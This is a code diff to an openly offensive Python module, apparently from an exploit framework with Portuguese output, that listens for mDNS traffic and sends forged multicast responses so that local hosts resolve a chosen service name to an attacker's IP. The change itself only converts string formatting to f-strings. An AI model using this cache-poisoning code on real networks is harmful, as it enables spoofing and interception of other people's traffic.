@@ -142,7 +142,7 @@ class Exploit(Exploit):
             )
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
         except OSError as exc:
-            print_warning("Falha ao vincular mDNS multicast: {} (requer root/admin)".format(exc))
+            print_warning(f"Falha ao vincular mDNS multicast: {exc} (requer root/admin)")
             sock.close()
             return discovered
 
@@ -167,8 +167,7 @@ class Exploit(Exploit):
         try:
             for i in range(count):
                 sock.sendto(payload, (_MDNS_MCAST_ADDR, _MDNS_PORT))
-                print_info("  Resposta envenenada {} de {} enviada ({} bytes)".format(
-                    i + 1, count, len(payload)))
+                print_info(f"  Resposta envenenada {i + 1} de {count} enviada ({len(payload)} bytes)")
                 time.sleep(0.2)
         finally:
             sock.close()
@@ -182,13 +181,13 @@ class Exploit(Exploit):
     @multi
     def run(self):
         """Enumera serviços mDNS e opcionalmente envenena o cache."""
-        print_status("Escutando mDNS multicast ({} segundos)...".format(self.timeout))
+        print_status(f"Escutando mDNS multicast ({self.timeout} segundos)...")
         discovered = self._listen_passive(int(self.timeout))
 
         if not discovered:
             print_warning("Nenhum host mDNS detectado")
         else:
-            print_success("{} host(s) mDNS detectado(s)".format(len(discovered)))
+            print_success(f"{len(discovered)} host(s) mDNS detectado(s)")
             headers = ["IP", "Resp/Query", "Respostas", "Raw (hex)"]
             rows = [
                 (ip,
@@ -207,13 +206,12 @@ class Exploit(Exploit):
             print_error("target (IP do atacante) deve ser definido para envenenamento ativo")
             return
 
-        print_warning("Iniciando envenenamento mDNS do serviço '{}'".format(self.poison_service))
-        print_warning("Redirecionando resoluções para: {}".format(self.target))
+        print_warning(f"Iniciando envenenamento mDNS do serviço '{self.poison_service}'")
+        print_warning(f"Redirecionando resoluções para: {self.target}")
         self._send_poison_responses(
             str(self.poison_service),
             str(self.target),
             int(self.poison_count),
             int(self.poison_ttl),
         )
-        print_success("Envenenamento mDNS concluído. Hosts na rede podem agora resolver '{}' para {}".format(
-            self.poison_service, self.target))
+        print_success(f"Envenenamento mDNS concluído. Hosts na rede podem agora resolver '{self.poison_service}' para {self.target}")
